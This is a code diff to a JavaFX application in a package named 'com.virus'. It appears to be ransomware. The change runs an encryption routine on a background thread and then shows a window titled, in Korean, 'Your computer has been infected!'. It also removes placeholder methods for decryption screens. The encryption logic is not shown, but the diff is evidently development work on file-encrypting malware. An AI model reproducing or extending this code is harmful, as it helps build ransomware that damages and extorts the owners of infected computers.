@@ -4,12 +4,11 @@ package com.virus;
 import com.sun.deploy.uitoolkit.impl.fx.HostServicesFactory;
 import com.sun.javafx.application.HostServicesDelegate;
 import javafx.application.Application;
+import javafx.concurrent.Task;
 import javafx.fxml.FXMLLoader;
 import javafx.scene.Parent;
 import javafx.scene.Scene;
 import javafx.stage.Stage;
-
-import java.io.IOException;
 
 public class Main extends Application {
     public static HostServicesDelegate hostServices;
@@ -42,26 +41,23 @@ public class Main extends Application {
             stage.setScene(scene1);
             stage.show();
 
-            System.out.println("암호화 시작");
-            Scene scene2 = new Scene(root2);
-            stage.setTitle("당신의 컴퓨터는 감염되었습니다!");
-            stage.setResizable(false);
-            stage.setScene(scene2);
-            encryptionController.encryption();
-            stage.show();
+            Task<Void> task = new Task<Void>() {
+                @Override
+                protected Void call() throws Exception {
+                    System.out.println("암호화 시작");
+                    encryptionController.encryption();
+                    return null;
+                }
+            };
+            task.setOnSucceeded(e -> {
+                Scene scene2 = new Scene(root2);
+                stage.setTitle("당신의 컴퓨터는 감염되었습니다!");
+                stage.setResizable(false);
+                stage.setScene(scene2);
+                stage.show();
+            });
+            new Thread(task).start();
         }
-    }
-
-    public static void changeToUndecryptedScene() {
-        System.out.print("복호화 화면으로 전환합니다");
-//        this.scene = new Scene(FXMLLoader.load(getClass().getResource("Undecripted.fxml")));
-//        stage.setScene(this.scene);
-    }
-
-    public static void changeToCompleteScene() {
-        System.out.print("복호화 축하 화면으로 전환합니다");
-//        this.scene = new Scene(FXMLLoader.load(getClass().getResource("Undecripted.fxml")));
-//        stage.setScene(this.scene);
     }
 
     public static void viewWeb(String url) {
